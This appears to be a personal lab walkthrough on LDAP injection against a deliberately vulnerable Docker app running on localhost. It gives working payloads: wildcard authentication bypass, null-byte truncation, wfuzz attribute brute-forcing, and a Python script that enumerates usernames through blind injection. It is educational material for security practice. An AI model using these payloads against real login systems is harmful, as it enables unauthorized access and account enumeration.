# Definition
Something to do.
# Installing and Preparing Lab
I will use the [LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App) GitHub project that contains the docker machine to practice this vulnerability.
```shell
git clone https://github.com/motikan2010/LDAP-Injection-Vuln-App
cd LDAP-Injection-Vuln-App
```
___
Then, we have to modify the **Dockerfile** file and edit that like this.
![[Pasted image 20230730165524.png]]
___
After that, let's follow the commands.
```shell
docker run -p 389:389 --name openldap-container --detach osixia/openldap:1.2.2
```
![[Pasted image 20230730165805.png]]
___
Then.
```shell
docker build -t ldap-client-container .
docker run -dit --link openldap-container -p 8888:80 ldap-client-container
```
![[Pasted image 20230730170304.png]]
___
## Adding Users and Fileds
To practice this lab, we need to create more users and fields that will be useful later on.
Let's enter into web *LDAP* container.
```shell
docker exec -it openldap-container bash
```
___
Now, from *openldap-container* machine.
```shell
cd /container/service/slapd/assets/test/
```
![[Pasted image 20230730180224.png]]
___
So, from our *MAIN* machine, let's create **three** users using that structure and adding *description* and *telephoneNumber* fields.
- *cxnsxle-user.ldif*
	```txt
	dn: uid=cxnsxle,dc=example,dc=org
	uid: cxnsxle
	cn: cxnsxle
	sn: 3
	objectClass: top
	objectClass: posixAccount
	objectClass: inetOrgPerson
	loginShell: /bin/bash
	homeDirectory: /home/cxnsxle
	uidNumber: 14583102
	gidNumber: 14564100
	userPassword: cxnsxle123
	mail: cxnsxle@cxnsxle.com
	description: The best hacker
	telephoneNumber: 987123654
	```
- *steve-user.ldif*
	```txt
	dn: uid=steve,dc=example,dc=org
	uid: steve
	cn: steve
	sn: 3
	objectClass: top
	objectClass: posixAccount
	objectClass: inetOrgPerson
	loginShell: /bin/bash
	homeDirectory: /home/steve
	uidNumber: 14583102
	gidNumber: 14564100
	userPassword: steve_12@ae@02!
	mail: steve@steve.com
	description: He is the top worker of this organization
	telephoneNumber: 456321789
	```
- *elianne-user.ldif*
	```txt
	dn: uid=elianne,dc=example,dc=org
	uid: elianne
	cn: elianne
	sn: 3
	objectClass: top
	objectClass: posixAccount
	objectClass: inetOrgPerson
	loginShell: /bin/bash
	homeDirectory: /home/elianne
	uidNumber: 14583102
	gidNumber: 14564100
	userPassword: iamsopretty
	mail: elianne@elianne.com
	description: The most beautiful girl she trust
	telephoneNumber: 312456987
	```
___
Now, we have to add this users to **LDAP** server using *ldapadd*.
```shell
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f cxnsxle-user.ldif
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f steve-user.ldif
ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f elianne-user.ldif
```
- `-x`: Specifies the use of *simple* authentication.
- `-H ldap://localhost`: **LDAP** server address.
- `-D "cn=admin,dc=example,dc=org"`: *Distinguished Name* of the user who is adding new users.
- `-w admin`: *password* of whe **admin** user specified at *-D*.
- `-f new-user.ldif`: The file containing data of new user.
![[Pasted image 20230730182236.png]]
___
# Attacking
## Contextualizing
To start, we could use *Nmap* to scan the port *389*, native for **LDAP**.
First, let's find a few *LDAP* script wrote by *Nmap*.
```shell
locate .nse | grep -e "ldap"
```
![[Pasted image 20230730183104.png]]
___
Then, we are going to use this script to scan the **LDAP** server.
```shell
nmap --script ldap\* -p 389 127.0.0.1
```
![[Pasted image 20230730183335.png]]
We can see the *namingContexts* found were **dc=example,dc=org**. Let's use this values in the following command.
```shell
ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin "cn=admin"
```
- `-b dc=example,dc=org`: The base to do the searching.
- `-D "cn=admin,dc=example,dc=org"`: *Distinguished Name* of the user who is searching.
- `"cn=admin"`: Search prompt.
![[Pasted image 20230730183845.png]]
___
## Injecting with Logic Operators
In the above command, we did use as *search prompt* **cn=admin**. But, we could use Logic Operators to concatenate more *conditions*.
```txt
"(&(cd=admin)(description=LDAP administrator))"
```
![[Pasted image 20230730184553.png]]
___
Another prompt that we could use whould be.
```txt
"(&(cd=admin)(description=LDAP*))"
```
The `*` specifies any character that follows to **LDAP**.
![[Pasted image 20230730184806.png]]
___
So, if we take a look at the *PHP* code of the website, you should see something like this.
```shell
docker exec -it eager_gould bash
```
![[Pasted image 20230730185224.png]]
Also, you can note that when the *credentials* are valid, then occurs a redirection **301**.
___
Then, you can see that the *LDAP query search* is very vulnerable. Therefore, we can use `*` to bypass the *password* authentication.
![[Pasted image 20230730185533.png]]
___
### Using BurpSuite
Let's use **BurpSuite** to know what is happening behind the **POST** request.
![[Pasted image 20230730190040.png]]
So, we can note that when we send invalid *credentials* the web doesn't respond with a **redirection 301** but with a **OK 200**.
___
We are going to use `*` to bypass the authentication like before.
![[Pasted image 20230730190318.png]]
___
## Loggin in with Null Byte
If you remember that in [[SQLI Basics]] and [[NoSQLI Basics]] there is a way to avoid the rest of the *query* by *using* `--` or  `#`.
The similar way we can use `(`, `)` and `%00` to achieve that.
For instance, if we want to *logg in* as the **cxnsxle** user.
![[Pasted image 20230730191255.png]]
___
## Enumerating
Great, with all the knowledge so far, we can **enumerate** many things like **users** or **field users**.
Let's use [[Wfuzz]] to do a *brute force* to find out fields of the users at *LDAP* server.
```shell
wfuzz -c -w /usr/share/SecLists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=anything&login=1&submit=Submit' http://localhost:8888
```
- `-c`: Mode with colors.
- `-w <WORD_LIST_PATH>`: Specifies the word list to use with **FUZZ** word.
- `-d 'user_id=admin)(FUZZ*))%00&password=anything&login=1&submit=Submit'`
	![[Pasted image 20230730194049.png]]
- `<IP>`: *LDAP* server address
![[Pasted image 20230730194148.png]]
___
You can see that there are lots of responses with **Chars** field with value **442**. Let's avoid them.
```shell
wfuzz -c --hh=550 -w /usr/share/SecLists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=anything&login=1&submit=Submit' http://localhost:8888
```
![[Pasted image 20230730194240.png]]
Now, we did find out all the **fields** of the user **admin** in **LDAP** server.
___
Then, we are going to list all the **fields** of the any *user* in **LDAP** server.
```shell
wfuzz -c --hh=550 -w /usr/share/SecLists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=*)(FUZZ=*))%00&password=anything&login=1&submit=Submit' http://localhost:8888
```
![[Pasted image 20230730194505.png]]
___
### Retrieving Information with Python Scripting
Now, we could use a *Python* script to automate the information from **LDAP** server with all the knowledge retreived so far.
```Python
#!/usr/bin/python3
import requests
import time
import signal
import sys
import string
import pdb

# function to manage CTRL+c
def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

# function to find out valid users by using brute force
def get_valid_users():
    # headers needed to sent POST data
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    # valid users acumulator
    valid_users = []
    # main bucle that will find out valid users
    for character_i in string.ascii_lowercase:
        # user acumulator
        valid_user = character_i
        # bucle to find out the entire username (max username size: 20)
        for index in range (0, 15):
            for character_j in '\0' + string.ascii_lowercase:
                # data to be sent
                post_data = 'user_id={}{}*&password=*&login=1&submit=Submit'.format(valid_user, character_j)

                # use BurpSuite to debug the requests sent
                #r = requests.post(target_url, headers=headers, data=post_data, allow_redirects=False, proxies=burp)
                r = requests.post(target_url, headers=headers, data=post_data, allow_redirects=False)

                # validate character matched by validating the status code 301 (redirection)
                if r.status_code == 301:
                    valid_user += character_j
                    break

        valid_users.append(valid_user)

    return [valid_user for valid_user in valid_users if len(valid_user) > 1]

# CTRL+c
signal.signal(signal.SIGINT, def_handler)

# global variables
target_url = "http://localhost:8888/"
burp = {'http': 'http://127.0.0.1:8080'}   # use BurpSuite proxie to manage debugging

if __name__ == "__main__":
    print(get_valid_users())
```
![[Pasted image 20230730221330.png]]
We were able to **enumerate** usernames listed on **LDAP** server.
You can modify the *Python* script to retrieve the **FIELDS** created before like *telephoneNumber* and *description*.
Feel free to improve the *Python* code by using **recursive** functions and so on.
___